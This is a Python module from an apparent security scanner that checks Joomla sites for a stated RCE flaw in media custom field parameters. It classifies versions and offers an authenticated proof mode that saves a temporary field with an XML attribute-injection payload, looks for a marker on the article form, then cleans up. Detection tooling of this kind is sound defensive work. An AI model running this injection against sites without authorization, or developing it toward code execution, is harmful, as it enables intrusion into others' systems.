from __future__ import annotations

import re
import secrets
from typing import Any

from ...core.args import aggressive_value
from ...core.auth import joomla_admin_login
from ...core.http import (
    HttpClient,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Confidence, Finding, Status
from ...core.probes import extract_csrf_from_html
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding

CVE_ID = "CVE-2026-129393"
NAME = "Joomla core RCE through media custom field parameters"
RULE = (
    "Joomla 4.0.0-5.4.10 and 6.0.0-6.2.0; the media custom field directory/preview "
    "parameters are not escaped in the generated form XML"
)
REMEDIATION = (
    "Upgrade to Joomla 5.4.11, 6.2.1, or newer. Joomla 4.x has no fixed release; "
    "migrate to a supported branch."
)
FIELD_FORM = (
    "/administrator/index.php?option=com_fields&view=field&layout=edit&context=com_content.article"
)
FIELD_ACTION = (
    "/administrator/index.php?option=com_fields&context=com_content.article&layout=edit&id=0"
)
FIELD_LIST = "/administrator/index.php?option=com_fields&view=fields&context=com_content.article"
ARTICLE_FORM = "/administrator/index.php?option=com_content&task=article.add"
TRASH_TASK = "/administrator/index.php?option=com_fields&task=fields.trash&context=com_content.article"
DELETE_TASK = "/administrator/index.php?option=com_fields&task=fields.delete&context=com_content.article"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return Status.INCONCLUSIVE
    if parse_version_required("4.0.0") <= parsed < parse_version_required("5.4.11"):
        return Status.LIKELY_VULNERABLE
    if parse_version_required("6.0.0") <= parsed < parse_version_required("6.2.1"):
        return Status.LIKELY_VULNERABLE
    if parsed >= parse_version_required("4.0.0"):
        return Status.PATCHED
    return Status.NOT_AFFECTED


def _form_token(body: str) -> str | None:
    return extract_csrf_from_html(body)


def _field_id(list_html: str, title: str) -> int:
    pattern = re.compile(
        r'href="[^"]*task=field\.edit&amp;id=(\d+)[^"]*"[^>]*title="Edit '
        + re.escape(title)
        + r'"'
    )
    match = pattern.search(list_html)
    if match:
        return int(match.group(1))
    return 0


def _save_field(
    client: HttpClient,
    timeout: int,
    title: str,
    name: str,
    payload: str,
) -> tuple[dict[str, Any] | None, str | None]:
    page = client.get(FIELD_FORM, timeout=timeout)
    if is_transport_error(page):
        return None, f"field form: {transport_error_detail(page)}"
    token = _form_token(str(page.get("body") or ""))
    if not token:
        return None, "the field form did not expose a CSRF token"

    reload_response = client.request(
        FIELD_ACTION,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(
            {
                "jform[context]": "com_content.article",
                "jform[type]": "media",
                "task": "field.reload",
                token: "1",
            }
        ),
        timeout=timeout,
    )
    if is_transport_error(reload_response):
        return None, f"media field form: {transport_error_detail(reload_response)}"
    token = _form_token(str(reload_response.get("body") or "")) or token

    fields = {
        "jform[id]": "0",
        "jform[context]": "com_content.article",
        "jform[group_id]": "0",
        "jform[title]": title,
        "jform[name]": name,
        "jform[type]": "media",
        "jform[required]": "0",
        "jform[only_use_in_subform]": "0",
        "jform[default_value]": "",
        "jform[state]": "1",
        "jform[language]": "*",
        "jform[label]": "",
        "jform[description]": "",
        "jform[access]": "1",
        "jform[ordering]": "1",
        "jform[assigned_cat_ids][]": "0",
        "jform[params][show_on]": "",
        "jform[params][showlabel]": "1",
        "jform[params][display]": "2",
        "jform[params][display_readonly]": "2",
        "jform[params][searchindex]": "0",
        "jform[fieldparams][directory]": payload,
        "jform[fieldparams][preview]": "true",
        "task": "field.save",
        token: "1",
    }
    response = client.request(
        FIELD_ACTION,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(fields),
        timeout=timeout,
    )
    if is_transport_error(response):
        return None, f"field save: {transport_error_detail(response)}"
    body = str(response.get("body") or "")
    if "field saved" not in body.lower() and "view=fields" not in str(response.get("final_url") or ""):
        return response, "the field save did not report success"
    return response, None


def _cleanup_field(client: HttpClient, field_id: int, timeout: int) -> bool:
    if field_id <= 0:
        return False
    for task in (TRASH_TASK, DELETE_TASK):
        page = client.get(FIELD_LIST, timeout=timeout)
        token = _form_token(str(page.get("body") or ""))
        if not token:
            return False
        response = client.request(
            task,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=form_encode({"cid[]": str(field_id), "boxchecked": "1", token: "1"}),
            timeout=timeout,
        )
        if task == DELETE_TASK:
            return "field deleted" in str(response.get("body") or "").lower()
    return False


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Create a temporary media field and look for an injected class attribute."""
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.BLOCKED_EXTERNAL,
            confidence=Confidence.MEDIUM,
            component="Joomla core com_fields media custom field",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{FIELD_FORM}",
            detail=(
                "The XML-injection proof needs an administrator session that can create custom "
                "fields. Pass --aggressive-arg username=... password=... on an authorized lab. "
                "Nothing was sent."
            ),
            action="Re-run with lab administrator credentials.",
            vulnerability_type="Remote Code Execution",
        )
    admin_timeout = max(timeout, 30)
    client = HttpClient(base_url=base, timeout=admin_timeout, proxy=proxy)
    preflight = client.get("/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.ERROR,
            confidence=Confidence.LOW,
            component="Joomla core com_fields media custom field",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
            vulnerability_type="Remote Code Execution",
        )
    if not joomla_admin_login(
        client, base_url=base, username=username, password=password, timeout=admin_timeout
    ):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.BLOCKED_EXTERNAL,
            confidence=Confidence.MEDIUM,
            component="Joomla core com_fields media custom field",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{FIELD_FORM}",
            detail="The administrator login was rejected; no custom field was created.",
            action="Verify the lab administrator credentials.",
            vulnerability_type="Remote Code Execution",
        )

    marker = f"proofcms-xml-{secrets.token_hex(6)}"
    title = f"ProofCMS XML marker {secrets.token_hex(4)}"
    name = f"proofcms_xml_{secrets.token_hex(5)}"
    payload = f'images" class="{marker}" x="'
    save, error = _save_field(client, admin_timeout, title, name, payload)
    field_id = 0
    if save is not None:
        field_id = _field_id(str(save.get("body") or ""), title)
    if not field_id:
        # The save response can time out after the database commit; the list
        # is the authoritative place to find the temporary field and its ID.
        list_page = client.get(FIELD_LIST, timeout=admin_timeout)
        field_id = _field_id(str(list_page.get("body") or ""), title)

    article = client.get(ARTICLE_FORM, timeout=admin_timeout)
    article_body = str(article.get("body") or "")
    injected = bool(
        re.search(
            r'class=["\'][^"\']*' + re.escape(marker) + r'[^"\']*["\']',
            article_body,
        )
    )
    cleanup_ok = _cleanup_field(client, field_id, admin_timeout) if field_id else False
    evidence: dict[str, Any] = {
        "endpoint": f"{base}{FIELD_FORM}",
        "article_form": f"{base}{ARTICLE_FORM}",
        "field_name": name,
        "field_title": title,
        "created_field_id": field_id,
        "marker": marker,
        "xml_attribute_injected": injected,
        "article_status": article.get("status", 0),
        "cleanup_verified": cleanup_ok,
    }
    if injected:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="Joomla core com_fields media custom field",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{FIELD_FORM}",
            evidence=evidence,
            detail=(
                "A temporary media custom field accepted a quote-bearing directory value. The "
                f"generated form XML gained the class attribute {marker}, which rendered on the "
                "article form. The XML injection is confirmed; no layout/class path was followed "
                "and no code was executed."
            ),
            action="Upgrade to Joomla 5.4.11, 6.2.1, or newer; audit custom fields for unusual parameters.",
            vulnerability_type="Remote Code Execution",
            cleanup_attempted=True,
            cleanup_verified=cleanup_ok,
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.HIGH,
        component="Joomla core com_fields media custom field",
        affected_rule=RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{FIELD_FORM}",
        evidence=evidence,
        detail=(
            "The temporary media field was processed, but the marker class did not appear on the "
            "article form. "
            + (f"The field save failed: {error}." if error else "The release likely escapes the XML values.")
        ),
        action="Verify Joomla runs 5.4.11, 6.2.1, or newer.",
        vulnerability_type="Remote Code Execution",
        cleanup_attempted=True,
        cleanup_verified=cleanup_ok,
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del kwargs
    finding = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation=REMEDIATION,
    )
    finding.exploit_available = True
    finding.vulnerability_type = "Remote Code Execution"
    if not run_exploit_check:
        return finding
    if exploit_mode != "aggressive":
        finding.detail += " This CVE requires the authenticated aggressive XML-injection probe."
        return finding
    if finding.status not in {Status.LIKELY_VULNERABLE, Status.INCONCLUSIVE}:
        finding.detail += " Aggressive proof skipped because the detected release is not affected."
        return finding
    probe = run_aggressive_probe(
        target_url,
        username=aggressive_value(aggressive_args, aggressive_command, "username")
        or aggressive_value(aggressive_args, aggressive_command, "admin_user"),
        password=aggressive_value(aggressive_args, aggressive_command, "password")
        or aggressive_value(aggressive_args, aggressive_command, "admin_password"),
        timeout=timeout,
        proxy=proxy,
    )
    probe.component_version = joomla_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return classify_version(joomla_version) in {Status.LIKELY_VULNERABLE, Status.INCONCLUSIVE}


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core com_fields media custom field",
        "affected_rule": RULE,
        "affected_joomla_versions": ["4.0.0-5.4.10", "6.0.0-6.2.0"],
        "exploit_available": True,
        "exploit_modes": ["aggressive"],
        "intrusive": True,
        "vulnerability_type": "Remote Code Execution",
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-25",
        "updated": "2026-11-25",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-129393",
            "https://developer.joomla.org/security-centre/1154-20261156-core-rce-through-media-custom-field-parameters.html",
        ],
    }
